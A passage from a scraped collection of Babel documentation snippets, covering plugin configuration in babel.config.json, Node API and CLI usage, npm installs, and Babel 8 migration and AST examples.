undefined\n  prop1!: string // Initialized to undefined\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel plugin via Node API\nDESCRIPTION: Uses the @babel/core Node API to transform JavaScript code with the @babel/plugin-proposal-record-and-tuple plugin. It takes code as input and returns the transformed code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-record-and-tuple.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [[\"@babel/plugin-proposal-record-and-tuple\"]],\n});\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration JSON Example\nDESCRIPTION: This JSON configuration snippet shows how to enable the `createParenthesizedExpression` parser option in Babel to preserve information about parentheses in the AST.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_53\n\nLANGUAGE: json\nCODE:\n```\n{ \"parserOpts\": { \"createParenthesizedExpression\": true } }\n```\n\n----------------------------------------\n\nTITLE: Set Class Methods JavaScript\nDESCRIPTION: This code snippet demonstrates a class definition in JavaScript. When the `setClassMethods` assumption is enabled, Babel assumes that methods don't shadow accessors or non-writable properties on the superclass prototype and that the program doesn't depend on methods being non-enumerable. This allows Babel to assign methods directly rather than using `Object.defineProperty`, which can improve performance.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_18\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo extends Bar {\n  method() {}\n\n  static check() {}\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin (CLI)\nDESCRIPTION: Command-line usage of Babel to apply the `transform-regexp-constructors` plugin to a JavaScript file. Requires the Babel CLI to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-constructors.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins transform-regexp-constructors script.js\n```\n\n----------------------------------------\n\nTITLE: Explicit Resource Management in Babel 8\nDESCRIPTION: Presents an example of explicit resource management in Babel 8 using the 'using' keyword. This manages resources ensuring proper disposal after use.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nusing reader = getReader()\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Assumptions (babel.config.json)\nDESCRIPTION: This example shows how to configure the `mutableTemplateObject` assumption in babel.config.json. When set to true, tagged template literals are not frozen.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-template-literals.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"assumptions\": {\n    \"mutableTemplateObject\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration (With Options)\nDESCRIPTION: Example of a babel.config.json file configuring the @babel/plugin-transform-modules-systemjs plugin with the `systemGlobal` option. This shows how to customize the plugin's behavior using options within the configuration file.  In this example, `systemGlobal` is set to \"SystemJS\".\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-systemjs.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-modules-systemjs\",\n      {\n        // outputs SystemJS.register(...)\n        \"systemGlobal\": \"SystemJS\"\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring JSON Modules Plugin in Babel (JSON)\nDESCRIPTION: This snippet configures the `@babel/plugin-proposal-json-modules` plugin in `babel.config.json`. It also specifies the target environments to ensure that Babel transforms the JSON imports to the appropriate code for each target.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-02-28-7.24.0.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"targets\": [\"chrome 90\", \"firefox 90\", \"node 20.6\"],\n  \"plugins\": [\"@babel/plugin-proposal-json-modules\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: This JSON configuration demonstrates how to enable the babel-plugin-transform-node-env-inline plugin by adding it to the plugins array in your babel.config.json file. This method is the recommended way to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-node-env-inline.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"transform-node-env-inline\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Computed Properties - Input for assumptions example\nDESCRIPTION: This code snippet demonstrates the JavaScript code that serves as input to the @babel/plugin-transform-computed-properties plugin. It contains an object with computed property names.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-computed-properties.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar obj = {\n  [\"x\" + foo]: \"heh\",\n  [\"y\" + bar]: \"noo\",\n  foo: \"foo\",\n  bar: \"bar\",\n};\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration: arrayLikeIsIterable Assumption\nDESCRIPTION: This JSON configuration shows the `arrayLikeIsIterable` assumption being configured. Setting it to `true` will destructure array-like objects as if they are arrays. It avoids using `Symbol.iterator`, which older browsers may lack support for.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-destructuring.md#_snippet_10\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"assumptions\": {\n    \"arrayLikeIsIterable\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: @babel/traverse Scope#rename - Block Argument Removal\nDESCRIPTION: This snippet shows the removal of the `block` argument from the `Scope#rename` method in `@babel/traverse`. It outlines the migration strategy, which involves calling `.rename()` directly on the scope corresponding to the block. It emphasizes adapting your usage of scope renaming to align with Babel 8's updated API. Dependencies: `@babel/traverse`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_73\n\nLANGUAGE: diff\nCODE:\n```\n- rename(oldName: string, newName?: string, block?: t.Pattern | t.Scopable)\n+ rename(oldName: string, newName?: string)\n```\n\n----------------------------------------\n\nTITLE: Selective Importing Module Members JavaScript\nDESCRIPTION: This code snippet demonstrates how to selectively import specific exported members from a module using the `import { ... }` syntax. It imports `sum` and `pi` from `lib/math`. It depends on the `lib/math` module. It outputs the value of `2π` to the console.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\n// otherApp.js\nimport {sum, pi} from \"lib/math\";\nconsole.log(\"2π = \" + sum(pi, pi));\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Targets with esmodules intersect in JSON\nDESCRIPTION: This JSON snippet demonstrates how to configure Babel's `targets` option with the `esmodules` option set to intersect. This combines the browsers target with ES Modules support.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_9\n\nLANGUAGE: json\nCODE:\n```\n{\n  // Resolve to \"Chrome 61+, FF60+, Safari 11+\"\n  \"targets\": {\n    \"esmodules\": \"intersect\", // Chrome 61+, FF 60+, Safari 10.1+\n    \"browsers\": \"chrome 58, firefox 60, safari 11\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining CallerData Flow Type\nDESCRIPTION: This Flow type definition shows the expected structure of the `caller` option. It includes fields like `name` to identify the caller and boolean flags to indicate support for various ECMAScript features.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_3\n\nLANGUAGE: flow\nCODE:\n```\ninterface CallerData {\n  name: string;\n  supportsStaticESM?: boolean;\n  supportsDynamicImport?: boolean;\n  supportsTopLevelAwait?: boolean;\n  supportsExportNamespaceFrom?: boolean;\n}\n```\n\n----------------------------------------\n\nTITLE: Update corejs version in babel.config.json\nDESCRIPTION: This code snippet demonstrates how to update the `corejs` version in the `babel.config.json` file when migrating from `@babel/runtime-corejs2` to `@babel/runtime-corejs3`.  It changes the `corejs` option from `2` to `3` within the `@babel/transform-runtime` plugin configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/transform-runtime\", {\n-   corejs: 2\n+   corejs: 3\n  }]\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming from AST Asynchronously (Promise)\nDESCRIPTION: Shows how to use `babel.transformFromAstAsync` to asynchronously transform an AST using Promises. It takes the AST, optional code string, and options. Requires @babel/core and babel.parseAsync to generate the AST.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst sourceCode = \"if (true) return;\";\nbabel\n  .parseAsync(sourceCode, { parserOpts: { allowReturnOutsideFunction: true } })\n  .then(parsedAst => {\n    return babel.transformFromAstAsync(parsedAst, sourceCode, options);\n  })\n  .then(({ code, map, ast }) => {\n    // ...\n  });\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel to use JSON Strings Syntax Plugin\nDESCRIPTION: Configures Babel to use the @babel/plugin-syntax-json-strings plugin by adding it to the plugins array in the babel.config.json file. This allows Babel to parse JSON string syntax in your code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-json-strings.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-json-strings\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Code snippet demonstrating how to use the `@babel/plugin-transform-react-inline-elements` plugin programmatically through the Node API. This is useful for integrating Babel into custom build processes.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-inline-elements.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-react-inline-elements\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration File: Plugin Usage\nDESCRIPTION: This JSON configuration file shows how to enable the @babel/plugin-transform-destructuring plugin within a Babel project. Adding the plugin to the `plugins` array ensures that Babel will use it during the transformation process.  This method is the recommended way to configure the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-destructuring.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-destructuring\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Wrapping TSEnumDeclaration members with TSEnumBody in Babel 8 (TS)\nDESCRIPTION: This snippet illustrates the wrapping of the `members` property of `TSEnumDeclaration` within a new `TSEnumBody` node in Babel 8. This provides a more structured representation of enum declarations.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_46\n\nLANGUAGE: typescript\nCODE:\n```\n// Example input\nenum ColorType {\n  Red,\n  Green,\n  Blue,\n}\n\n// AST in Babel 7\n{\n  type: \"TSEnumDeclaration\",\n  id: Identifier(\"ColorType\")\n  members: [\n    EnumMember(\"Red\"),\n    EnumMember(\"Green\"),\n    EnumMember(\"Blue\")\n  ]\n}\n\n// AST in Babel 8\n{\n  type: \"TSEnumDeclaration\",\n  id: Identifier(\"ColorType\")\n  body: {\n    type: \"TSEnumBody\",\n    members: [\n      EnumMember(\"Red\"),\n      EnumMember(\"Green\"),\n      EnumMember(\"Blue\")\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: React Component Creation (Output)\nDESCRIPTION: Shows the output after the plugin adds the `displayName` property to the React components. The display name is inferred from the variable name.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-display-name.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = React.createClass({\n  displayName: \"foo\",\n}); // React <= 15\nvar bar = createReactClass({\n  displayName: \"bar\",\n}); // React 16+\n```\n\n----------------------------------------\n\nTITLE: Constructing Deeply Nested Classes in JavaScript\nDESCRIPTION: Illustrates using optional chaining with the `new` operator to construct deeply nested classes, ensuring that the constructor is only called if all intermediate properties exist. The snippet shows that top-level classes can be called directly, too.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-chaining.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst obj = {\n  foo: {\n    bar: {\n      baz: class {\n      },\n    },\n  },\n};\n\nconst baz = new obj?.foo?.bar?.baz(); // baz instance\n\nconst safe = new obj?.qux?.baz(); // undefined\nconst safe2 = new obj?.foo.bar.qux?.(); // undefined\n\nconst willThrow = new obj?.foo.bar.qux(); // Error: not a constructor\n\n// Top classes can be called directly, too.\nclass Test {\n}\nnew Test?.(); // test instance\n\nnew exists?.(); // undefined\n```\n\n----------------------------------------\n\nTITLE: Transforming Code Asynchronously (Promise)\nDESCRIPTION: Illustrates how to use `babel.transformAsync` to asynchronously transform JavaScript code using Promises. The function takes code and options, returning a Promise that resolves with an object containing the transformed code, source map, and AST. Requires @babel/core and babel configurations.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabel.transformAsync(code, options); // => Promise<{ code, map, ast }>\n```\n\n----------------------------------------\n\nTITLE: Bluebird non-promise runtime error JavaScript\nDESCRIPTION: This code snippet shows how to handle the Bluebird non-promise runtime error that occurs when using `await` with non-promise values. It demonstrates how to manually transform the value to a promise using `Promise.resolve()`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-to-generator.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\n-  await 42;\n+  await Promise.resolve(42);\n```\n\n----------------------------------------\n\nTITLE: Using Babel core library in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the `@babel/core` library to transform JavaScript code.  It requires the library and uses the `transformSync` method to transform the provided code string with the specified options object.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nconst babel = require(\"@babel/core\");\n\nbabel.transformSync(\"code\", optionsObject);\n```\n\n----------------------------------------\n\nTITLE: Using Babel Plugin via Node API\nDESCRIPTION: This JavaScript code shows how to use the @babel/plugin-transform-json-strings plugin programmatically via the Babel Node API. It requires the @babel/core package.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-strings.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-json-strings\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Node API: Pipeline Operator with @@ Topic Token\nDESCRIPTION: This JavaScript code shows how to use the @babel/plugin-proposal-pipeline-operator via the Node API, setting the topic token to '@@'.  It uses @babel/core's `transformSync` to transform code with the plugin enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-pipeline-operator.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\n    [ \"@babel/plugin-proposal-pipeline-operator\", { topicToken: \"@@\" } ],\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: TypeScript Namespace Example\nDESCRIPTION: Illustrates how TypeScript namespace code should be explicitly referred to values not in the same namespace definition, even if they would be in the scope according to TypeScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_16\n\nLANGUAGE: TypeScript\nCODE:\n```\nnamespace N {\n  export const V = 1;\n}\nnamespace N {\n  export const W = N.V;\n}\n```\n\nLANGUAGE: TypeScript\nCODE:\n```\nnamespace N {\n  export const V = 1;\n  export const W = V;\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with Globals Override JSON\nDESCRIPTION: This JSON snippet showcases how to override global library names in the browser environment using the `globals` option of the Babel plugin. It remaps the `es6-promise` library to `Promise`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-modules-umd\",\n      {\n        \"globals\": {\n          \"es6-promise\": \"Promise\"\n        }\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Using babel-preset-minify via Node API\nDESCRIPTION: This JavaScript code shows how to use the 'minify' preset with the Babel Node API. It uses `transformSync` to transform the provided code string using the 'minify' preset.  Requires `@babel/core` to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-minify.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  presets: [\"minify\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Optional Chaining Assignment Example in JavaScript\nDESCRIPTION: This code snippet shows an example of optional chaining assignment using the `?.` operator on the left-hand side of an assignment. It requires the `@babel/plugin-proposal-optional-chaining-assign` plugin, and you must specify the version (e.g., `2023-07`).\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-09-25-7.23.0.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nmaybeAnObj?.prop = theValue;\n\n// Equivalent to\n\nif (maybeAnObj != null) maybeAnObj.prop = theValue;\n```\n\n----------------------------------------\n\nTITLE: Configure useBuiltIns Option in babel.config.json\nDESCRIPTION: JSON configuration showing how to configure the useBuiltIns option for the object rest spread plugin. When enabled, Object.assign is used directly.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-rest-spread.md#_snippet_7\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"assumptions\": {\n    \"setSpreadProperties\": true\n  },\n  \"plugins\": [\n    [\"@babel/plugin-transform-object-rest-spread\", { \"useBuiltIns\": true }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Node API usage\nDESCRIPTION: This JavaScript code shows how to use the Babel Node API to transform code with the `@babel/plugin-proposal-import-defer` and `@babel/plugin-transform-modules-commonjs` plugins. Requires `@babel/core` to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-defer.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\n    \"@babel/plugin-proposal-import-defer\",\n    \"@babel/plugin-transform-modules-commonjs\"\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via Node API (JavaScript)\nDESCRIPTION: Shows how to use the plugin programmatically through the Babel Node API.  The require('@babel/core').transformSync function is used to transform code with the specified plugins. The 'code' parameter is the JavaScript source code to be transformed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-property-in-object.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-private-property-in-object\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Installing the Plugin with npm\nDESCRIPTION: Command line instruction to install the Babel plugin using npm. This plugin transforms optional chaining syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-chaining.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-optional-chaining\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with JSON\nDESCRIPTION: This JSON configuration shows how to enable the `@babel/plugin-transform-react-jsx-self` plugin in a Babel project. This method is recommended and involves adding the plugin to the `plugins` array in `babel.config.json`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-self.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-react-jsx-self\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Config: Basic Plugin Configuration (JSON)\nDESCRIPTION: Example babel.config.json file demonstrating how to enable the @babel/plugin-transform-react-jsx plugin without any specific options.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx.md#_snippet_9\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-react-jsx\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: This JSON configuration file demonstrates how to enable the @babel/plugin-transform-unicode-regex plugin within a Babel project.  The plugin is added to the \"plugins\" array, which instructs Babel to use it during the transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-regex.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-unicode-regex\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuration with ignoreFunctionLength Assumption\nDESCRIPTION: This JSON configuration snippet shows how to set the `ignoreFunctionLength` assumption.  Setting this option can result in a more performant output because the JavaScript engine does not need to track the arguments array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-parameters.md#_snippet_6\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"assumptions\": {\n    \"ignoreFunctionLength\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Private Field 'in' Expression with Loose Mode (JavaScript)\nDESCRIPTION: Demonstrates the transformation of private field 'in' expressions in loose mode.  The 'In' code shows the same class as before. The 'Out' code displays the transformed code, now using Object.defineProperty and Object.prototype.hasOwnProperty for compatibility.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-property-in-object.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  #bar = \"bar\";\n\n  test(obj) {\n    return #bar in obj;\n  }\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  constructor() {\n    Object.defineProperty(this, _bar, {\n      writable: true,\n      value: \"bar\",\n    });\n  }\n\n  test() {\n    return Object.prototype.hasOwnProperty.call(this, _bar);\n  }\n}\n\nvar _bar = babelHelpers.classPrivateFieldLooseKey(\"bar\");\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: Configures the Babel plugin within the `babel.config.json` file. This is the recommended way to enable the plugin for all Babel transformations within the project. The plugin is added to the `plugins` array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-throw-expressions.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-proposal-throw-expressions\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Compile with Watch Mode\nDESCRIPTION: Compiles `script.js` to `script-compiled.js` and watches for changes, recompiling automatically upon modification. This uses the `--watch` option for continuous compilation.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel script.js --watch --out-file script-compiled.js\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: Command-line interface (CLI) usage of Babel to transform a JavaScript file using the @babel/plugin-transform-object-rest-spread plugin. Specifies the plugin to use during the transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-rest-spread.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-object-rest-spread script.js\n```\n\n----------------------------------------\n\nTITLE: Configuration File - Plugin with Options\nDESCRIPTION: This JSON configuration shows how to enable the @babel/plugin-transform-spread plugin with options, specifically the `loose` option, in a babel.config.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-spread.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-spread\",\n      {\n        \"loose\": true\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: JSON Module Transform (Browsers)\nDESCRIPTION: This shows how the JSON module import is transformed when targeting browsers. It uses `fetch` API to resolve and parse the JSON file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-modules.md#_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nconst data = await fetch(import.meta.resolve(\"./data.json\")).then(r => r.json());\n```\n\n----------------------------------------\n\nTITLE: Context Has Method in Decorators (JavaScript)\nDESCRIPTION: This code snippet demonstrates the new `.has` method available on `context.access`, allowing developers to check if an object has a corresponding element. This enhancement provides a reliable way to verify the existence of properties or methods within the decorated class.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-02-20-7.21.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n// #x in new A\naccessX.has(new A) === true;\n```\n\n----------------------------------------\n\nTITLE: Spread Syntax Transformation - Input\nDESCRIPTION: This example demonstrates the input code containing spread syntax that will be transformed by the @babel/plugin-transform-spread plugin. It showcases spreading an array into another array and as arguments to a function.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-spread.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nvar a = [\"a\", \"b\", \"c\"];\n\nvar b = [...a, \"foo\"];\n\nvar c = foo(...a);\n```\n\n----------------------------------------\n\nTITLE: Babel Node API Usage\nDESCRIPTION: Shows how to use the Babel Node API to transform code using the plugin.  The `transformSync` method is used to synchronously transform the provided code string with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-typescript\"],\n});\n```\n\n----------------------------------------\n\nTITLE: REPL with input history using rlwrap (OSX specific)\nDESCRIPTION: Launches a babel-node REPL with input history using rlwrap. These commands are often required on OSX to provide readline functionality.\nSOURCE: https://github.com/babel/website/blob/main/docs/node.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nNODE_NO_READLINE=1 rlwrap --always-readline npx babel-node\n```\n\n----------------------------------------\n\nTITLE: Selective Babel Configuration with overrides (JavaScript)\nDESCRIPTION: This snippet shows how to use the `overrides` option in `babel.config.js` to apply different Babel configurations to different sets of files based on glob patterns. It defines separate configurations for files in `node_modules` and `tests` directories.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  presets: [\n    // default config...\n  ],\n  overrides: [{\n    test: [\"./node_modules\"],\n    presets: [\n      // config for node_modules\n    ],\n  }, {\n    test: [\"./tests\"],\n    presets: [\n      // config for tests\n    ],\n  }]\n};\n```\n\n----------------------------------------\n\nTITLE: JavaScript Example: Inline Consecutive Adds Transformation\nDESCRIPTION: Demonstrates the transformation performed by the plugin. Consecutive property assignments to an object and pushes to an array are transformed into object and array literals respectively.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-inline-consecutive-adds.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst foo = {};\nfoo.a = 42;\nfoo.b = [\"hi\"];\nfoo.c = bar();\nfoo.d = \"str\";\n\n...\nconst bar = [];\nbar.push(1);\nbar.push(2);\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst foo = {\n  a: 42,\n  b: [\"hi\"],\n  c: bar(),\n  d: \"str\"\n};\n\n...\nconst bar = [1, 2];\n```\n\n----------------------------------------\n\nTITLE: Install Babel Object Rest Spread Plugin\nDESCRIPTION: Command to install the @babel/plugin-transform-object-rest-spread plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-rest-spread.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-object-rest-spread\n```\n\n----------------------------------------\n\nTITLE: Using @babel/plugin-syntax-typescript via Node API\nDESCRIPTION: This JavaScript code shows how to use the plugin with Babel's Node API. The plugin is included in the options object passed to transformSync, which parses the provided code using the TypeScript syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-typescript.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-typescript\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with do in JSX\nDESCRIPTION: Illustrates using the `do` expression within JSX to conditionally render different components based on a color prop. This eliminates the need for a separate function to handle the conditional logic. Requires React and the do expression plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-do-expressions.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst Component = props => (\n  <div className=\"myComponent\">\n    {do {\n      if (color === \"blue\") {\n        <BlueComponent />;\n      } else if (color === \"red\") {\n        <RedComponent />;\n      } else if (color === \"green\") {\n        <GreenComponent />;\n      }\n    }}\n  </div>\n);\n```\n\n----------------------------------------\n\nTITLE: Plugin Installation via npm (Shell)\nDESCRIPTION: This command installs the `@babel/plugin-transform-regenerator` plugin as a development dependency using npm. The `--save-dev` flag ensures it's added to the `devDependencies` section of the `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regenerator.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-regenerator\n```\n\n----------------------------------------\n\nTITLE: Importing CommonJS Module in ESM\nDESCRIPTION: This JavaScript example demonstrates how an ECMAScript module imports a CommonJS module. It highlights the potential issues with default export interop in Node.js, where the default import might refer to the entire `module.exports` object instead of the `exports.default` property.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-04-29-7.14.0.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport two from \"two\";\nconsole.log(two());\n```\n\n----------------------------------------\n\nTITLE: Transforming MemberExpressions with visitor and state in JavaScript\nDESCRIPTION: This JavaScript snippet shows how to use the `memberExpressionToFunctions` helper to transform MemberExpression nodes. It defines a visitor that identifies specific MemberExpressions and a state object with `get`, `set`, and `call` methods to handle the transformation. The helper replaces matched MemberExpressions with appropriate function calls using the provided state methods. The `memoise` method is an optional handler for self-referential update expressions. It requires the @babel/types package and the `memberExpressionToFunctions` helper.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-member-expression-to-functions.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst visitor = {\n  